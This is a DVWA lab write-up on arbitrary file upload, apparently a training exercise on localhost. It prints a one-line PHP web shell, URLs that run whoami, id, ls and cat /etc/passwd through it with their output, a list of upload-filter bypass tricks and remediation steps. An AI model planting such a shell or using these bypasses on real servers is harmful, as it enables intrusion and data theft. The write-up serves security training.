# DVWA Lab — Arbitrary File Upload

## Objective
Upload malicious PHP file to server and achieve Remote Code Execution (RCE)
by executing uploaded file through web browser.

## Environment
- Target: DVWA running on localhost
- URL: http://localhost/DVWA
- Login: admin / password
- Security Level: Low

## Steps

### 1. Access File Upload Module
- Login to DVWA
- Navigate to: Vulnerabilities → File Upload

### 2. Create PHP Shell
```bash
nano shell.php
```

Content:
```php
<?php system($_GET['cmd']); ?>
```

Save file.

### 3. Upload PHP File
Click: Choose File → select shell.php → Upload

**Result:** File successfully uploaded ✅

http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami

**Result:**
www-data

Confirms PHP execution with www-data privileges ✅

### 5. Execute id Command
Go to:
http://localhost/DVWA/hackable/uploads/shell.php?cmd=id

**Result:**
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Shows current user context and groups ✅

### 6. List Files in Upload Directory
Go to:
http://localhost/DVWA/hackable/uploads/shell.php?cmd=ls%20-la

**Result:**
total 16 drwxrwxrwx 2 root root 4096 Jul 6 18:05 .
drwxrwxrwx 5 root root 4096 Apr 22 20:11 ..
-rw-r--r-- 1 www-data www-data 31 Jul 6 18:05 shell.php
dvwa_email.png

Shell.php file visible in uploads directory ✅

### 7. Read Sensitive System Files
Go to:
http://localhost/DVWA/hackable/uploads/shell.php?cmd=cat%20/etc/passwd

**Result:** Complete /etc/passwd file displayed showing all system users ✅

## Vulnerability Explanation
Application accepts file uploads without validating file type.
Uploaded files placed in web-accessible directory.
PHP files executed by web server when accessed via HTTP.

Vulnerable code:
```php
move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_file);
```

No extension check = PHP files can be uploaded and executed.

## Impact
- Remote Code Execution (RCE) ✅ Achieved
- Full server compromise
- Malware distribution
- Website defacement
- Data theft
- Lateral movement to other systems

## File Upload Bypass Techniques
- .php → .php5, .phtml, .phar, .phps
- Double extension: shell.php.jpg
- Null byte: shell.php%00.jpg
- Case variation: shell.PhP
- Image + PHP: Combine PHP code in JPG
- .htaccess upload: Change execution rules

## Remediation
- Whitelist allowed file types (pdf, jpg, png only)
- Validate file magic bytes / signatures
- Store uploads outside web root (/var/uploads_private/)
- Rename uploaded files (hash-based)
- Disable script execution in upload directory
- Use antivirus/malware scanning
- Implement file size limits

## Tools Used
- DVWA
- Text editor (nano)
- Web browser
- PHP knowledge

## Status
✅ Successfully uploaded and executed arbitrary code
✅ Full Remote Code Execution achieved
✅ System file read access confirmed

